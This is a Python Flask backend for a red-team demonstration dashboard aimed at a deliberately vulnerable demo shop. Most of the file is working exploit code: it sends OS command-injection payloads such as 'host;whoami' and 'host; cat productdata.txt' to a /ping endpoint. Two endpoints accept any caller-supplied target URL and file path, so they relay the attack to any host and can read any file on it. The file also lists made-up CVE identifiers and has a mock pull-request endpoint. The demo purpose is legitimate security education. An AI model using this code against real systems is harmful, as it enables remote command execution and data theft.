#!/usr/bin/env python3
"""
Dashboard Backend API
====================
Backend API for the Red Team Demonstration Dashboard.

This API provides endpoints to:
- Execute exploit commands and return request/response data
- List CVEs found in the application
- Retrieve exploit scripts
- Execute exploits and return both script and output
"""

import os
import json
import subprocess
import requests
import urllib3
from flask import Flask, jsonify, request
from flask_cors import CORS
from datetime import datetime
from typing import Dict, List, Any

# Load environment variables from .env file if it exists
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass  # python-dotenv not installed, skip loading .env file

try:
    import resend
except ImportError:
    resend = None

# Disable SSL warnings for testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app)  # Enable CORS for frontend access

# Configuration
TARGET_URL = os.environ.get('TARGET_URL', 'https://vulnerable-ecommerce-6pgqjb4bma-uc.a.run.app')
EXPLOIT_SCRIPT_PATH = os.path.join(os.path.dirname(__file__), '..', 'exploit', 'exploit.py')
READ_FILE_SCRIPT_PATH = os.path.join(os.path.dirname(__file__), '..', 'exploit', 'read_file.py')
RESEND_API_KEY = os.environ.get('RESEND_API_KEY', '')
RESEND_FROM_EMAIL = os.environ.get('RESEND_FROM_EMAIL', 'Red Team Demo <onboarding@resend.dev>')

# Initialize Resend if API key is provided
if resend and RESEND_API_KEY:
    resend.api_key = RESEND_API_KEY

# Asset names to use for different test scenarios
ASSET_NAMES = [
    'api-server',
    'db-prod.vulnmart.internal',
    'admin.vulnmart.internal',
    'monitoring.vulnmart.internal'
]


@app.route('/health', methods=['GET'])
def health():
    """Health check endpoint."""
    return jsonify({
        'status': 'healthy',
        'service': 'Dashboard Backend API',
        'version': '1.0.0',
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/exploit/test', methods=['GET'])
def exploit_test():
    """
    Execute exploit commands with different asset names.
    Returns request and response data for each curl command.
    """
    results = []
    
    # Test scenarios based on the curl commands
    test_scenarios = [
        {
            'name': 'Normal Ping',
            'asset': 'localhost',
            'command': 'ping',
            'payload': 'localhost'
        },
        {
            'name': 'Command Injection - User Info',
            'asset': ASSET_NAMES[0],  # api-server
            'command': 'whoami',
            'payload': f'{ASSET_NAMES[0]};whoami'
        },
        {
            'name': 'Command Injection - Data Exfiltration',
            'asset': ASSET_NAMES[1],  # db-prod.vulnmart.internal
            'command': 'cat productdata.txt',
            'payload': f'{ASSET_NAMES[1]};cat productdata.txt'
        }
    ]
    
    for scenario in test_scenarios:
        try:
            # URL encode the payload
            encoded_payload = requests.utils.quote(scenario['payload'])
            url = f"{TARGET_URL}/ping?host={encoded_payload}"
            
            # Make the request
            start_time = datetime.now()
            response = requests.get(url, timeout=30, verify=False)
            end_time = datetime.now()
            
            # Parse response
            response_data = {}
            if response.status_code in [200, 500]:
                try:
                    response_data = response.json()
                except:
                    response_data = {'raw': response.text}
            
            # Extract command output from response
            output = response_data.get('output', response_data.get('error', ''))
            
            # Determine if exploit was successful
            exploit_success = False
            if scenario['command'] == 'whoami' and 'appuser' in output:
                exploit_success = True
            elif scenario['command'] == 'cat productdata.txt' and 'VULNMART CONFIDENTIAL' in output:
                exploit_success = True
            
            result = {
                'scenario': scenario['name'],
                'asset_name': scenario['asset'],
                'request': {
                    'method': 'GET',
                    'url': url,
                    'payload': scenario['payload'],
                    'command': scenario['command']
                },
                'response': {
                    'status_code': response.status_code,
                    'headers': dict(response.headers),
                    'data': response_data,
                    'output': output[:5000] if len(output) > 5000 else output,  # Truncate if too long
                    'output_length': len(output)
                },
                'timing': {
                    'start_time': start_time.isoformat(),
                    'end_time': end_time.isoformat(),
                    'duration_ms': (end_time - start_time).total_seconds() * 1000
                },
                'exploit_success': exploit_success,
                'timestamp': datetime.now().isoformat()
            }
            
            results.append(result)
            
        except Exception as e:
            results.append({
                'scenario': scenario['name'],
                'asset_name': scenario['asset'],
                'error': str(e),
                'timestamp': datetime.now().isoformat()
            })
    
    return jsonify({
        'success': True,
        'target_url': TARGET_URL,
        'test_count': len(test_scenarios),
        'results': results,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/cves', methods=['GET'])
def list_cves():
    """
    Return list of CVEs found in the application.
    Includes the main CVE (command injection) and 4 additional CVEs with lower severity.
    """
    cves = [
        {
            'cve_id': 'CVE-2024-COMMAND-INJECTION',
            'cwe_id': 'CWE-78',
            'title': 'OS Command Injection in /ping Endpoint',
            'severity': 'CRITICAL',
            'cvss_score': 9.8,
            'description': 'The /ping endpoint is vulnerable to OS command injection. User input is passed directly to subprocess with shell=True without sanitization, allowing arbitrary command execution.',
            'affected_endpoint': '/ping?host=<payload>',
            'attack_vector': 'Network',
            'impact': 'Remote Code Execution, Data Exfiltration, Complete System Compromise',
            'status': 'VULNERABLE',
            'discovered': '2025-01-31',
            'references': [
                'https://cwe.mitre.org/data/definitions/78.html',
                'https://owasp.org/www-community/attacks/Command_Injection'
            ]
        },
        {
            'cve_id': 'CVE-2024-INFO-DISCLOSURE',
            'cwe_id': 'CWE-209',
            'title': 'Information Disclosure in Error Messages',
            'severity': 'MEDIUM',
            'cvss_score': 5.3,
            'description': 'Error messages may leak sensitive information about the application structure, file paths, and internal system details.',
            'affected_endpoint': 'All endpoints (error handling)',
            'attack_vector': 'Network',
            'impact': 'Information Disclosure, System Enumeration',
            'status': 'VULNERABLE',
            'discovered': '2025-01-31',
            'references': [
                'https://cwe.mitre.org/data/definitions/209.html'
            ]
        },
        {
            'cve_id': 'CVE-2024-MISSING-RATE-LIMIT',
            'cwe_id': 'CWE-307',
            'title': 'Missing Rate Limiting on API Endpoints',
            'severity': 'MEDIUM',
            'cvss_score': 5.3,
            'description': 'API endpoints lack rate limiting, allowing attackers to perform brute force attacks, DoS, or rapid exploitation attempts without throttling.',
            'affected_endpoint': 'All endpoints',
            'attack_vector': 'Network',
            'impact': 'Denial of Service, Brute Force Attacks',
            'status': 'VULNERABLE',
            'discovered': '2025-01-31',
            'references': [
                'https://cwe.mitre.org/data/definitions/307.html'
            ]
        },
        {
            'cve_id': 'CVE-2024-INSECURE-HEADERS',
            'cwe_id': 'CWE-693',
            'title': 'Missing Security Headers',
            'severity': 'LOW',
            'cvss_score': 3.1,
            'description': 'Application does not set security headers such as X-Content-Type-Options, X-Frame-Options, Content-Security-Policy, which could lead to XSS or clickjacking attacks.',
            'affected_endpoint': 'All endpoints',
            'attack_vector': 'Network',
            'impact': 'Cross-Site Scripting (XSS), Clickjacking',
            'status': 'VULNERABLE',
            'discovered': '2025-01-31',
            'references': [
                'https://cwe.mitre.org/data/definitions/693.html'
            ]
        },
        {
            'cve_id': 'CVE-2024-VERBOSE-ERRORS',
            'cwe_id': 'CWE-209',
            'title': 'Verbose Error Messages in Production',
            'severity': 'LOW',
            'cvss_score': 2.5,
            'description': 'Application returns detailed stack traces and error messages in production environment, potentially exposing internal application structure.',
            'affected_endpoint': 'Error handlers',
            'attack_vector': 'Network',
            'impact': 'Information Disclosure',
            'status': 'VULNERABLE',
            'discovered': '2025-01-31',
            'references': [
                'https://cwe.mitre.org/data/definitions/209.html'
            ]
        }
    ]
    
    return jsonify({
        'success': True,
        'total_cves': len(cves),
        'critical': len([c for c in cves if c['severity'] == 'CRITICAL']),
        'medium': len([c for c in cves if c['severity'] == 'MEDIUM']),
        'low': len([c for c in cves if c['severity'] == 'LOW']),
        'cves': cves,
        'timestamp': datetime.now().isoformat()
    })


@app.route('/api/exploit/script', methods=['GET'])
def get_exploit_script():
    """
    Return the exploit script content.
    """
    try:
        script_type = request.args.get('type', 'exploit')  # 'exploit' or 'read_file'
        
        if script_type == 'read_file':
            script_path = READ_FILE_SCRIPT_PATH
        else:
            script_path = EXPLOIT_SCRIPT_PATH
        
        if not os.path.exists(script_path):
            return jsonify({
                'success': False,
                'error': f'Script not found: {script_path}'
            }), 404
        
        with open(script_path, 'r') as f:
            script_content = f.read()
        
        return jsonify({
            'success': True,
            'script_type': script_type,
            'script_path': script_path,
            'script_content': script_content,
            'file_size': len(script_content),
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/exploit/execute', methods=['POST'])
def execute_exploit():
    """
    Execute exploit commands and return request/response data (similar to curl output).
    Returns the response data we see from the exploit, not the script execution.
    """
    try:
        data = request.get_json() or {}
        script_type = data.get('type', 'read_file')  # 'exploit' or 'read_file'
        target_url = data.get('target_url', TARGET_URL)
        asset_name = data.get('asset_name', 'localhost')
        file_path = data.get('file_path', 'productdata.txt')
        
        # Read script content for reference
        if script_type == 'exploit':
            script_path = EXPLOIT_SCRIPT_PATH
            # For exploit type, execute a sample command (whoami)
            command = 'whoami'
            payload = f'{asset_name}; {command}'
        else:  # read_file
            script_path = READ_FILE_SCRIPT_PATH
            # For read_file type, execute cat command
            command = f'cat {file_path}'
            payload = f'{asset_name}; {command}'
        
        if not os.path.exists(script_path):
            return jsonify({
                'success': False,
                'error': f'Script not found: {script_path}'
            }), 404
        
        # Read script content
        with open(script_path, 'r') as f:
            script_content = f.read()
        
        # Execute the exploit command via HTTP request (like curl)
        encoded_payload = requests.utils.quote(payload)
        url = f"{target_url}/ping?host={encoded_payload}"
        
        start_time = datetime.now()
        response = requests.get(url, timeout=30, verify=False)
        end_time = datetime.now()
        
        # Parse response
        response_data = {}
        output = ''
        if response.status_code in [200, 500]:
            try:
                response_data = response.json()
                output = response_data.get('output', response_data.get('error', ''))
            except:
                response_data = {'raw': response.text}
                output = response.text
        
        # Determine if exploit was successful
        exploit_success = False
        if script_type == 'exploit' and 'appuser' in output:
            exploit_success = True
        elif script_type == 'read_file' and 'VULNMART CONFIDENTIAL' in output:
            exploit_success = True
        
        return jsonify({
            'success': True,
            'script_type': script_type,
            'script_content': script_content,
            'request': {
                'method': 'GET',
                'url': url,
                'payload': payload,
                'command': command,
                'asset_name': asset_name
            },
            'response': {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'data': response_data,
                'output': output[:10000] if len(output) > 10000 else output,  # Truncate if too long
                'output_length': len(output)
            },
            'timing': {
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_ms': (end_time - start_time).total_seconds() * 1000
            },
            'exploit_success': exploit_success,
            'parameters': {
                'target_url': target_url,
                'asset_name': asset_name,
                'file_path': file_path if script_type == 'read_file' else None
            },
            'timestamp': datetime.now().isoformat()
        })
        
    except requests.exceptions.Timeout:
        return jsonify({
            'success': False,
            'error': 'Request timed out after 30 seconds'
        }), 504
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/exploit/read-file', methods=['POST'])
def read_file_exploit():
    """
    Execute read_file exploit and return request/response data (similar to curl output).
    Returns the response data we see from the exploit, not the script execution.
    """
    try:
        data = request.get_json() or {}
        target_url = data.get('target_url', TARGET_URL)
        file_path = data.get('file_path', 'productdata.txt')
        asset_name = data.get('asset_name', 'localhost')
        
        if not os.path.exists(READ_FILE_SCRIPT_PATH):
            return jsonify({
                'success': False,
                'error': f'Script not found: {READ_FILE_SCRIPT_PATH}'
            }), 404
        
        # Read script content for reference
        with open(READ_FILE_SCRIPT_PATH, 'r') as f:
            script_content = f.read()
        
        # Execute the exploit command via HTTP request (like curl)
        command = f'cat {file_path}'
        payload = f'{asset_name}; {command}'
        encoded_payload = requests.utils.quote(payload)
        url = f"{target_url}/ping?host={encoded_payload}"
        
        start_time = datetime.now()
        response = requests.get(url, timeout=30, verify=False)
        end_time = datetime.now()
        
        # Parse response
        response_data = {}
        output = ''
        if response.status_code in [200, 500]:
            try:
                response_data = response.json()
                output = response_data.get('output', response_data.get('error', ''))
            except:
                response_data = {'raw': response.text}
                output = response.text
        
        # Determine if exploit was successful
        exploit_success = 'VULNMART CONFIDENTIAL' in output
        
        return jsonify({
            'success': True,
            'script_content': script_content,
            'request': {
                'method': 'GET',
                'url': url,
                'payload': payload,
                'command': command,
                'asset_name': asset_name
            },
            'response': {
                'status_code': response.status_code,
                'headers': dict(response.headers),
                'data': response_data,
                'output': output[:10000] if len(output) > 10000 else output,  # Truncate if too long
                'output_length': len(output)
            },
            'timing': {
                'start_time': start_time.isoformat(),
                'end_time': end_time.isoformat(),
                'duration_ms': (end_time - start_time).total_seconds() * 1000
            },
            'exploit_success': exploit_success,
            'parameters': {
                'target_url': target_url,
                'file_path': file_path,
                'asset_name': asset_name
            },
            'timestamp': datetime.now().isoformat()
        })
        
    except requests.exceptions.Timeout:
        return jsonify({
            'success': False,
            'error': 'Request timed out after 30 seconds'
        }), 504
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/api/email/send', methods=['POST'])
def send_exploit_email():
    """
    Send an email using Resend API with exploit details, results, and a call to action to generate PR.
    """
    if not resend:
        return jsonify({
            'success': False,
            'error': 'Resend library not installed. Install with: pip install resend'
        }), 500
    
    if not RESEND_API_KEY:
        return jsonify({
            'success': False,
            'error': 'RESEND_API_KEY environment variable not set'
        }), 500
    
    try:
        data = request.get_json() or {}
        recipient_email = data.get('to')
        exploit_results = data.get('exploit_results', {})
        target_url = data.get('target_url', TARGET_URL)
        
        if not recipient_email:
            return jsonify({
                'success': False,
                'error': 'Recipient email address (to) is required'
            }), 400
        
        # Extract exploit details
        exploit_success = exploit_results.get('exploit_success', False)
        response_data = exploit_results.get('response', {})
        output = response_data.get('output', '')
        output_length = response_data.get('output_length', 0)
        status_code = response_data.get('status_code', 0)
        request_data = exploit_results.get('request', {})
        command = request_data.get('command', 'N/A')
        asset_name = request_data.get('asset_name', 'N/A')
        
        # Create HTML email content
        html_content = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; }}
                .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
                .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; text-align: center; border-radius: 10px 10px 0 0; }}
                .content {{ background: #f9f9f9; padding: 30px; border: 1px solid #ddd; }}
                .section {{ margin-bottom: 25px; }}
                .section-title {{ color: #667eea; font-size: 18px; font-weight: bold; margin-bottom: 10px; border-bottom: 2px solid #667eea; padding-bottom: 5px; }}
                .status {{ display: inline-block; padding: 5px 15px; border-radius: 20px; font-weight: bold; margin: 10px 0; }}
                .status.success {{ background: #4caf50; color: white; }}
                .status.failed {{ background: #f44336; color: white; }}
                .details {{ background: white; padding: 15px; border-radius: 5px; margin: 10px 0; border-left: 4px solid #667eea; }}
                .details-item {{ margin: 8px 0; }}
                .details-label {{ font-weight: bold; color: #555; }}
                .code-block {{ background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: 'Courier New', monospace; font-size: 12px; margin: 10px 0; }}
                .cta-button {{ display: inline-block; background: #667eea; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; margin: 20px 0; text-align: center; }}
                .cta-button:hover {{ background: #5568d3; }}
                .footer {{ text-align: center; padding: 20px; color: #777; font-size: 12px; }}
                .warning {{ background: #fff3cd; border: 1px solid #ffc107; padding: 15px; border-radius: 5px; margin: 15px 0; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>🔴 Red Team Exploitation Report</h1>
                    <p>Security Vulnerability Assessment</p>
                </div>
                
                <div class="content">
                    <div class="section">
                        <div class="section-title">📊 Exploitation Summary</div>
                        <div class="details">
                            <div class="details-item">
                                <span class="details-label">Target URL:</span> {target_url}
                            </div>
                            <div class="details-item">
                                <span class="details-label">Asset Name:</span> {asset_name}
                            </div>
                            <div class="details-item">
                                <span class="details-label">Command Executed:</span> {command}
                            </div>
                            <div class="details-item">
                                <span class="details-label">HTTP Status:</span> {status_code}
                            </div>
                            <div class="details-item">
                                <span class="details-label">Output Length:</span> {output_length:,} characters
                            </div>
                            <div class="details-item">
                                <span class="details-label">Exploit Status:</span>
                                <span class="status {'success' if exploit_success else 'failed'}">
                                    {'✓ SUCCESS' if exploit_success else '✗ FAILED'}
                                </span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="section">
                        <div class="section-title">📋 Exploit Results</div>
                        <div class="code-block">
{output[:2000] if len(output) > 2000 else output}
{'... (truncated)' if len(output) > 2000 else ''}
                        </div>
                    </div>
                    
                    <div class="section">
                        <div class="section-title">⚠️ Critical Vulnerability Detected</div>
                        <div class="warning">
                            <strong>CVE-2024-COMMAND-INJECTION (CRITICAL - CVSS 9.8)</strong><br>
                            The application is vulnerable to OS Command Injection (CWE-78) in the /ping endpoint.
                            This allows remote code execution and complete system compromise.
                        </div>
                    </div>
                    
                    <div class="section">
                        <div class="section-title">🚀 Next Steps</div>
                        <p>Based on the exploitation results, immediate action is required to secure the application.</p>
                        <div style="text-align: center; margin: 30px 0;">
                            <a href="#" class="cta-button" onclick="window.location.href='/api/generate-pr'">
                                Generate Pull Request
                            </a>
                        </div>
                        <p style="text-align: center; color: #777;">
                            Click the button above to automatically generate a pull request with security fixes.
                        </p>
                    </div>
                    
                    <div class="section">
                        <div class="section-title">📝 Recommended Actions</div>
                        <ul>
                            <li>Remove shell=True from subprocess calls</li>
                            <li>Implement strict input validation</li>
                            <li>Use parameterized commands</li>
                            <li>Apply principle of least privilege</li>
                            <li>Add security headers and rate limiting</li>
                        </ul>
                    </div>
                </div>
                
                <div class="footer">
                    <p>This is an automated security assessment report.</p>
                    <p>Generated on {datetime.now().strftime('%Y-%m-%d %H:%M:%S UTC')}</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        # Send email via Resend
        params = {
            "from": RESEND_FROM_EMAIL,
            "to": [recipient_email],
            "subject": f"🔴 Red Team Exploitation Report - {'SUCCESS' if exploit_success else 'FAILED'}",
            "html": html_content,
        }
        
        email_response = resend.Emails.send(params)
        
        return jsonify({
            'success': True,
            'message': 'Email sent successfully',
            'email_id': email_response.get('id'),
            'to': recipient_email,
            'subject': params['subject'],
            'timestamp': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'Failed to send email: {str(e)}'
        }), 500


@app.route('/api/generate-pr', methods=['GET'])
def generate_pr():
    """
    Generate a pull request (mock endpoint that returns success message).
    """
    try:
        # Get optional parameters from query string
        pr_title = request.args.get('title', 'Security Fix: Command Injection Vulnerability')
        pr_description = request.args.get('description', '')
        
        # In a real implementation, this would:
        # 1. Create a new branch
        # 2. Apply security fixes
        # 3. Commit changes
        # 4. Create a pull request via GitHub/GitLab API
        
        return jsonify({
            'success': True,
            'message': 'Pull request has been successfully generated',
            'pr': {
                'title': pr_title,
                'status': 'created',
                'number': 'PR-12345',  # Mock PR number
                'url': 'https://github.com/example/repo/pull/12345',  # Mock PR URL
                'branch': 'security/fix-command-injection',
                'description': pr_description or 'This PR addresses the critical command injection vulnerability (CVE-2024-COMMAND-INJECTION) by implementing proper input validation and removing shell=True from subprocess calls.',
                'changes': [
                    'Removed shell=True from subprocess.check_output()',
                    'Added input validation and sanitization',
                    'Implemented parameterized commands',
                    'Added security headers',
                    'Added rate limiting'
                ],
                'timestamp': datetime.now().isoformat()
            }
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': f'Failed to generate PR: {str(e)}'
        }), 500


@app.errorhandler(404)
def not_found(e):
    """Handle 404 errors."""
    return jsonify({
        'success': False,
        'error': 'Endpoint not found',
        'available_endpoints': [
            'GET /health',
            'GET /api/exploit/test',
            'GET /api/cves',
            'GET /api/exploit/script',
            'POST /api/exploit/execute',
            'POST /api/exploit/read-file',
            'POST /api/email/send',
            'GET /api/generate-pr'
        ]
    }), 404


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))  # Changed from 5000 to avoid macOS ControlCenter conflict
    print(f"""
    ╔══════════════════════════════════════════════════════════════╗
    ║                                                              ║
    ║   📊 Dashboard Backend API                                  ║
    ║                                                              ║
    ╚══════════════════════════════════════════════════════════════╝
    
    Starting Dashboard Backend API
    Server running on http://0.0.0.0:{port}
    (Using port {port} to avoid macOS ControlCenter on port 5000)
    
    Endpoints:
    - GET  /health                  - Health check
    - GET  /api/exploit/test        - Test exploit commands
    - GET  /api/cves                - List CVEs
    - GET  /api/exploit/script     - Get exploit script
    - POST /api/exploit/execute     - Execute exploit
    - POST /api/exploit/read-file   - Read file via exploit
    - POST /api/email/send          - Send exploit report email
    - GET  /api/generate-pr         - Generate security fix PR
    """)
    
    app.run(host='0.0.0.0', port=port, debug=False)
